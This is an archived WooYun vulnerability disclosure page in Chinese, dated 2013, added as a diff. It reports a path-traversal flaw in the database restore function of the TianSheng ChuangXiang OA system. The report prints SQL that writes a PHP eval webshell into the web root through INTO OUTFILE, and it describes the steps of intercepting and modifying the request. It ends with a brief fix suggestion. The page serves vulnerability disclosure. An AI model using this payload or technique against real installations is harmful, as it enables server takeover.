@@ -1,0 +1,197 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		天生创想OA系统GETSHELL漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		天生创想OA系统GETSHELL漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/xfkxfk">xfkxfk</a> 
+</li><li>提交时间：		2013-12-11 14:18</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-12-11：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2014-03-11：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">天生创想OA通过绕过限制操作任意文件，GETSHELL</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">看看出现问题的代码：<br />
+<br />
+</p><p class="detail"><a href="../images/1015050016e757e4ff5921a4a25b46963f76ad1e.png" target="_blank"><img src="../images/1015050016e757e4ff5921a4a25b46963f76ad1e.png" alt="daima.png" width="600"/></a></p><p class="detail"><br />
+<br />
+问题出在数据库备份还原处。<br />
+<br />
+主要在这里的file_get_contents处，把传进来的filename加上filename所在目录就是所要打开的文件路径了。<br />
+<br />
+这里的filename所在目录就是data_dir，也就是数据库备份的的目录data/db/目录了。<br />
+<br />
+正常情况下是data/db/xxx.sql，这是所要还原的数据文件的路径，我们传进来的是xxx.sql文件名，那么我们通过../../就回到了根目录下，就可以跳到其他目录的文件了，这里也没有检测后缀，那么我们传一个内容为sql语句的jpg文件，这里进行还原就会执行我们的sql语句啦。<br />
+<br />
+传文件，这里我们上传的文件内容是sql语句如下：<br />
+<br />
+Drop TABLE IF EXISTS temp;<br />
+<br />
+Create TABLE temp(cmd text NOT NULL);<br />
+<br />
+Insert INTO temp (cmd) VALUES(&quot;&lt;?php @eval($_POST[&#039;cmd&#039;]);?&gt;&quot;);<br />
+<br />
+Select cmd from temp into outfile &#039;F:/wwwroot/Apache2/htdocs/TOA/eval.php&#039;;<br />
+<br />
+Drop TABLE IF EXISTS temp;<br />
+<br />
+这样就会在根目录下创建一个eval.php的一句话小马文件。<br />
+<br />
+</p><p class="detail"><a href="../images/10150509282e9f383f0366b09155daf8b43cd617.png" target="_blank"><img src="../images/10150509282e9f383f0366b09155daf8b43cd617.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+然后我们随便找一个数据表备份一下，返回了备份sql文件的所在目录：<br />
+<br />
+</p><p class="detail"><a href="../images/10150518b220a70f5c9f1e8bd8660ae529b78839.png" target="_blank"><img src="../images/10150518b220a70f5c9f1e8bd8660ae529b78839.png" alt="2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+然后我们来还原一下这个备份的sql文件：<br />
+<br />
+</p><p class="detail"><a href="../images/10150528b52d68a07561e0647fdb6631f19f03ba.png" target="_blank"><img src="../images/10150528b52d68a07561e0647fdb6631f19f03ba.png" alt="3.png" width="600"/></a></p><p class="detail"><br />
+<br />
+然后抓包：<br />
+<br />
+</p><p class="detail"><a href="../images/10150538075f05793bd935221088211bacecd025.png" target="_blank"><img src="../images/10150538075f05793bd935221088211bacecd025.png" alt="4.png" width="600"/></a></p><p class="detail"><br />
+<br />
+这里的filename是刚才备份的sql文件，我们修改一下：<br />
+<br />
+</p><p class="detail"><a href="../images/1015054632b565b895c324ece6bfdcf9d26aada7.png" target="_blank"><img src="../images/1015054632b565b895c324ece6bfdcf9d26aada7.png" alt="5.png" width="600"/></a></p><p class="detail"><br />
+<br />
+成功还原了我们的替换了文件的sql备份文件，我们来连接一下是否创建eval.php成功：<br />
+<br />
+</p><p class="detail"><a href="../images/10150557678c0b3a3d5b1a822fda652a6ba47470.png" target="_blank"><img src="../images/10150557678c0b3a3d5b1a822fda652a6ba47470.png" alt="6.png" width="600"/></a></p><p class="detail"><br />
+<br />
+成功连接，拿下shell。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/1015061869d0d0f800cb5addf1c04abddd0eafcb.png" target="_blank"><img src="../images/1015061869d0d0f800cb5addf1c04abddd0eafcb.png" alt="6.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">控制还原数据的文件类型。<br />
+<br />
+禁止文件包含等。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/xfkxfk" title="xfkxfk">xfkxfk</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-045488" title="天生创想OA系统GETSHELL漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																	
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="45488";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
